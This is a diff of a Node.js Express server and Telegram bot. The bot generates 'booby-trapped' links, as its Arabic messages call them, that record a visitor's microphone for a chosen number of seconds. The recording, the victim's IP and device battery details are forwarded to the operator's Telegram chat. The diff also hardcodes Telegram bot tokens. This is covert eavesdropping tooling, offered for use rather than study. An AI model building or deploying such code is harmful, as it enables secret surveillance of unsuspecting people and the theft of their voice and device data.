@@ -4,9 +4,8 @@ const bodyParser = require('body-parser');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
-const geoip = require('geoip-lite');
-const useragent = require('useragent');
-const botToken = '7244359397:AAELs6eOA3t03zH7w2g2EXIaNHdXSBMOEWc'; 
+
+const botToken = '7244359397:AAHJieFIF4SnCD3EEHc5tWYeZXgfC7b_tEw';
 const bot = new TelegramBot(botToken, { polling: true });
 const app = express();
 
@@ -22,7 +21,6 @@ app.post('/submitVoice', upload.single('voice'), (req, res) => {
     const voicePath = req.file.path;
     const additionalData = JSON.parse(req.body.additionalData);
 
-    // إعداد النص المرافق للتسجيل الصوتي
     const caption = `
 معلومات إضافية:
 IP: ${additionalData.ip}
@@ -34,8 +32,8 @@ IP: ${additionalData.ip}
 الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
     `;
 
-    bot.sendVoice(chatId, voicePath, { caption: caption }).then(() => {
-        fs.unlinkSync(voicePath); 
+    bot.sendVoice(chatId, voicePath, { caption }).then(() => {
+        fs.unlinkSync(voicePath);
         res.send('Voice submitted successfully!');
     }).catch(error => {
         console.error(error);
@@ -65,9 +63,7 @@ bot.onText(/\/start/, (msg) => {
 });
 
 bot.on('callback_query', (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const chatId = msg.chat.id;
-
+    const chatId = callbackQuery.message.chat.id;
     if (callbackQuery.data === 'select_duration') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     }
@@ -79,7 +75,7 @@ bot.on('message', (msg) => {
 
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
-            const link = `https://creative-marmalade-periwinkle.glitch.me/record?chatId/${chatId}?duration=${duration}`;
+            const link = `https://creative-marmalade-periwinkle.glitch.me/record?chatId=${chatId}&duration=${duration}`;
             bot.sendMessage(chatId, `تم تلغيم الرابط  لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
